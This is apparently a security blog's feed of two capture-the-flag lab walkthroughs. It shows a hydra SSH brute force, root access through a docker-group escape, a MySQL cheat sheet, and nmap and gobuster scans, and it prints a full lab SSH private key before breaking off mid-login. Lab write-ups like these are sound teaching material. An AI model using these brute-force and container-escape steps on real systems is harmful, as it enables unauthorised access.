href="#1、构造字典" class="headerlink" title="1、构造字典"></a>1、构造字典</h2><p>查找<code>rockyou</code>字典里面包含<code>ml</code>的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep <span class="hljs-string">&#x27;^ml&#x27;</span> &gt; ml.txt<br></code></pre></td></tr></table></figure><h2 id="2、hydra爆破"><a href="#2、hydra爆破" class="headerlink" title="2、hydra爆破"></a>2、hydra爆破</h2><p><code>hydra -l ml -P ml.txt ssh://192.168.2.39 -vV </code><br>成功找到密码<code>mlmlml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# hydra -l ml -P ml.txt ssh://192.168.2.39 -vV <br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-26 09:42:03<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 5819 login tries (l:1/p:5819), ~364 tries per task<br>[DATA] attacking ssh://192.168.2.39:22/<br>[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class="hljs-keyword">done</span><br>[INFO] Testing <span class="hljs-keyword">if</span> password authentication is supported by ssh://ml@192.168.2.39:22<br>[INFO] Successful, password authentication is supported by ssh://192.168.2.39:22<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlb123&quot;</span> - 1 of 5819 [child 0] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlmlml&quot;</span> - 2 of 5819 [child 1] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mladen&quot;</span> - 3 of 5819 [child 2] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlover&quot;</span> - 4 of 5819 [child 3] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlm123&quot;</span> - 5 of 5819 [child 4] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlking&quot;</span> - 6 of 5819 [child 5] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlc123&quot;</span> - 7 of 5819 [child 6] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;ml1234&quot;</span> - 8 of 5819 [child 7] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlp123&quot;</span> - 9 of 5819 [child 8] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlovem&quot;</span> - 10 of 5819 [child 9] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlkmlk&quot;</span> - 11 of 5819 [child 10] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlovesj&quot;</span> - 12 of 5819 [child 11] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlopez&quot;</span> - 13 of 5819 [child 12] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mlmmlm&quot;</span> - 14 of 5819 [child 13] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mleigh&quot;</span> - 15 of 5819 [child 14] (0/0)<br>[ATTEMPT] target 192.168.2.39 - login <span class="hljs-string">&quot;ml&quot;</span> - pass <span class="hljs-string">&quot;mluisa&quot;</span> - 16 of 5819 [child 15] (0/0)<br>[ERROR] could not connect to target port 22: Socket error: Connection reset by peer<br>[ERROR] ssh protocol error<br>[ERROR] could not connect to target port 22: Socket error: Connection reset by peer<br>[ERROR] ssh protocol error<br>[ERROR] could not connect to target port 22: Socket error: Connection reset by peer<br>[ERROR] ssh protocol error<br>[VERBOSE] Disabled child 8 because of too many errors<br>[VERBOSE] Disabled child 12 because of too many errors<br>[VERBOSE] Disabled child 14 because of too many errors<br>[22][ssh] host: 192.168.2.39   login: ml   password: mlmlml<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.39 (waiting <span class="hljs-keyword">for</span> children to complete tests)<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 3 final worker threads did not complete <span class="hljs-keyword">until</span> end.<br>[ERROR] 3 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-26 09:42:19<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong><br>根据爆破出来的用户名<code>ml</code>和密码<code>mlmlml</code>，进行ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh ml@192.168.2.39                   <br>ml@192.168.2.39 is password: <br>Linux language 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>ml@language:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>ml@language:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;this-is-user-flag!!!&#125;<br></code></pre></td></tr></table></figure><h1 id="提权-Docker逃逸"><a href="#提权-Docker逃逸" class="headerlink" title="提权-Docker逃逸"></a>提权-Docker逃逸</h1><p>使用<code>sudo -l</code>进行查看，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ml@language:~$ <span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> ml: <br></code></pre></td></tr></table></figure><p>查看用户<code>id</code>，发现用户名<code>ml</code>属于<code>docker组</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ml@language:~$ <span class="hljs-built_in">id</span><br>uid=1001(ml) gid=1001(ml) <span class="hljs-built_in">groups</span>=1001(ml),113(docker)<br></code></pre></td></tr></table></figure><p>Docker守护进程允许docker用户组的成员和root用户访问Docker。 当前用户如果属于这个组，就可以使用Docker命令尝试提权。</p><p>拉取镜像启动一个新的容器，以<code>sh</code>或者<code>/bin/bash</code>作为<code>shell</code>启动，并将宿主机的<code>/</code>目录挂载到容器的<code>/mnt</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ml@language:/tmp$ docker ps<br>CONTAINER ID   IMAGE            COMMAND     CREATED      STATUS             PORTS                            NAMES<br>b0dd1db70539   area39/pikachu   <span class="hljs-string">&quot;/run.sh&quot;</span>   2 days ago   Up About an hour   3306/tcp, 0.0.0.0:9999-&gt;80/tcp   pikachu<br>ml@language:/tmp$ docker run -v /:/mnt --<span class="hljs-built_in">rm</span> -it area39/pikachu <span class="hljs-built_in">chroot</span> /mnt sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/root.txt</span><br>flag&#123;this-is-root-flag!!!&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、Docker逃逸"><a href="#1、Docker逃逸" class="headerlink" title="1、Docker逃逸"></a>1、Docker逃逸</h2><p>相关文章：<a href="https://wiki.teamssix.com/CloudNative/Docker/">Docker 介绍 | T Wiki</a></p><h2 id="2、Mysql常用命令"><a href="#2、Mysql常用命令" class="headerlink" title="2、Mysql常用命令"></a>2、Mysql常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接数据库</span><br>mysql -h<span class="hljs-variable">$IP</span> -uroot -p<span class="hljs-variable">$passwd</span> -P3306<br><br><span class="hljs-comment">#查库</span><br>show databases; - 列出所有数据库<br><br><span class="hljs-comment">#选择/切换数据库</span><br>use database_name; - 进入指定数据库<br><span class="hljs-keyword">select</span> database(); - 查看当前所在数据库<br><br><span class="hljs-comment">#查表</span><br>show tables; - 当前库的所有表<br>show tables from db_name; - 查看其他库的表<br><br><span class="hljs-comment">#查字段</span><br><span class="hljs-keyword">select</span> * from table_name;<br>show columns from table_name<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql</tag>
      
      <tag>hydra</tag>
      
      <tag>提权-docker逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Space</title>
    <link href="/Maze-sec/Space/"/>
    <url>/Maze-sec/Space/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><hr><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00058s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00074s latency).<br>MAC Address: 08:00:27:DA:82:3D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00059s latency).<br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.21 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.38</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.38<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00035s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 38.95 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.38<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00058s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Typing Challenge<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.72 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232334381.png"><br>提示打字游戏，输入上面的文字，完成后有提示，根据步骤，完成上述的打字游戏，得到提示<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232336591.png"></p><p>访问<code>andeli.id_rsa</code>，猜测是<code>andeli</code>用户的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA53wtJ27uQatcM+9fP8gZCT7ioVbSmFM5MWZZ+4ZZ/AJswfuI9ndz<br>ADvJgrVgCj2//vHO7Hla0V4S7nHccrFLVuHxzxtcTXiITKmo+S0N0uBu0NdkzFwvmTPqR4<br>tG/p1G6fgt9fms9tqw/A2EYf5Mk/cDv9OwhGldUArQZD9Dd/Zy7ZnRGhBVHm/HTxbwCad0<br>n4Or9+PEUzJb5Uw+GG8A3P0J128BUlIxj4M2/I769q3xSG4EuT9kqAJXCdxAvIzZ6OIfEI<br>9yFoRPbDLEe+95y5zoQpH6Yar5LqiK+X+YnxScWWwCe3r4BQJCiHT7LjIK0HH5YUMkFcr7<br>t9QvNytztJPr2pVQET9UdkiN27u2DCygVw5y1q0rP3fCsEZDCUJxcfjn9PZw5IRzqJcO1B<br>PIFacPpvv/jWI1DA1smd0+xr/AUWEBL4892GZ6hMR4uNLlva2iPoTs4cfZthecXWd0ImCy<br>WcSe6S5pFNWZ+C/u7Td7l46xhlN6Tw/N2n1vQrupAAAFiGVFw9FlRcPRAAAAB3NzaC1yc2<br>EAAAGBAOd8LSdu7kGrXDPvXz/IGQk+4qFW0phTOTFmWfuGWfwCbMH7iPZ3cwA7yYK1YAo9<br>v/7xzux5WtFeEu5x3HKxS1bh8c8bXE14iEypqPktDdLgbtDXZMxcL5kz6keLRv6dRun4Lf<br>X5rPbasPwNhGH+TJP3A7/TsIRpXVAK0GQ/Q3f2cu2Z0RoQVR5vx08W8AmndJ+Dq/fjxFMy<br>W+VMPhhvANz9CddvAVJSMY+DNvyO+vat8UhuBLk/ZKgCVwncQLyM2ejiHxCPchaET2wyxH<br>vvecuc6EKR+mGq+S6oivl/mJ8UnFlsAnt6+AUCQoh0+y4yCtBx+WFDJBXK+7fULzcrc7ST<br>69qVUBE/VHZIjdu7tgwsoFcOctatKz93wrBGQwlCcXH45/T2cOSEc6iXDtQTyBWnD6b7/4<br>1iNQwNbJndPsa/wFFhAS+PPdhmeoTEeLjS5b2toj6E7OHH2bYXnF1ndCJgslnEnukuaRTV<br>mfgv7u03e5eOsYZTek8Pzdp9b0K7qQAAAAMBAAEAAAGADZsS3Fp8zodP6A2Nv6X3Mr/rei<br>gsQJ/DoM+vQkVnTJSn587tAe+LZtwcv/4BIxj2C/oSe3u2hs/MtQ8kMemR0A1/tPiauEL5<br>X+go8lxfj6F5YfUHC6vvcEXI42OgTJ7Z6C6aJPcD346DEI2K1meoAJpoMgIzQdUfkvDPxt<br>ShFo/5uVVtIOcM2bkgMdnbSfX5uNZ4aR2OEIXJOPT+QVlk55hH183CeiAyoYjI1pdg0Nbw<br>c51j0a+ULvvUOdQkSfDNUXD2G7I6UxIYCWOkh2uq0ddPU+Kwe7d12+cnvpub1BEtKAfCTG<br>+NSL8y76bO2u/I7f/kPRzV7Hm4po0X5tZc0fn1tctqV2M+Hu+JoCrs/yVwo0CuA29h/pHh<br>cg1cBzn7jISuDMIAU5l8/nzs4/q/AIfQzqywYUrt04dkcTBmoPyI1QZiD6LufA8L8ZYqQB<br>TrzFsiw/DZNIUBW0XKECr3OQWiaTz44g1YWxKCpFjbXOcR+E25BNAL8eTl3D63OIIBAAAA<br>wCszq5giZqnTab2lVPvtEDePkQHRBZzShp0xm5Ru5kCyzoCrkbyrHH0GhoH77RIItrwd/3<br>XHXtzSAXsWWWiTIkO4zl9xV0dTs85mqeLCSQtS4yG8rz1vMsPCRPysKAo0pXMgvvKHqehl<br>yIU99M3jVPbBiwIuXFGohWr4agxrqMOcsuNIPx3PFmO3lqo08blC+GUBerk8+fiIhkJWe0<br>izzECGHV9xcCoOiwiAdQjr2hNzw9QfnpO/w9uWKmb1397aoQAAAMEA9D47nMj7KvxQtcWz<br>XMXnbqE1Z9EDavrAoA1zZSLrGzJs7jWZyWJuKv450wuf2fqrMCMA0BVngNnS3ljXj04pAg<br>EU5sFE8WOlVNvC9iSd1x5Nmo7DMItdKSHeJop63flzvi+7aNg9VX+qWS4oWMuMZ0m7Vupf<br>mC+xiO+dng7BBFWKIYqrcdWCuBqA6TdOt/qycejhZpTzXzYs/KsmMBjl7uSuUQZu2f6GDl<br>KvCxTjcpE8v7FgSPJv4TNg/DjbEneZAAAAwQDyoLp4Rapn6iXTKFqOAL/8m+uH8dqgB5OD<br>560gxDEgINdYzxwfOz+p3gphSp54MczEJEnYnfvDfKYKR5ty0AXS0iEjEoGAQFXuRjWEQf<br>MeTEb+VqnK/Y5sNXWwW/FVr2tTibwA0QlzQEtOOAceh5HcKrtKpxZjkK2d4odvY6MmbL/J<br>Rtgh4TMV09EokfXACR9F/bNY5Lu+xFMef4NWtXl3e0GEZcoLDSsKCuloOJJoJR/IM1w8gs<br>Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.38 -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.38<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 14241]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/check.php            (Status: 302) [Size: 0] [--&gt; index.php]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>未发现其他目录</p><h1 id="SSH渗透"><a href="#SSH渗透" class="headerlink" title="SSH渗透"></a>SSH渗透</h1><h2 id="1、ssh登录"><a href="#1、ssh登录" class="headerlink" title="1、ssh登录"></a>1、ssh登录</h2><p>尝试使用发现的私钥进行登录</p><ul><li><p>保存私钥到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# wget http://192.168.2.38/andeli.id_rsa<br>--2025-06-23 23:01:22--  http://192.168.2.38/andeli.id_rsa<br>正在连接 192.168.2.38:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2640 (2.6K)<br>正在保存至: “andeli.id_rsa”<br><br>andeli.id_rsa                       100%[==================================================================&gt;]   2.58K  --.-KB/s  用时 0s      <br><br>2025-06-23 23:01:22 (108 MB/s) - 已保存 “andeli.id_rsa” [2640/2640])<br></code></pre></td></tr></table></figure></li><li><p>修改私钥的权限 <strong>私钥的权限必须为600</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">chmod</span> 600 andeli.id_rsa <br></code></pre></td></tr></table></figure></li><li><p>尝试进行SSH登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh andeli@192.168.2.38 -i andeli.id_rsa <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.38 (192.168.2.38)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:5: [hashed name]</span><br><span class="hljs-string">    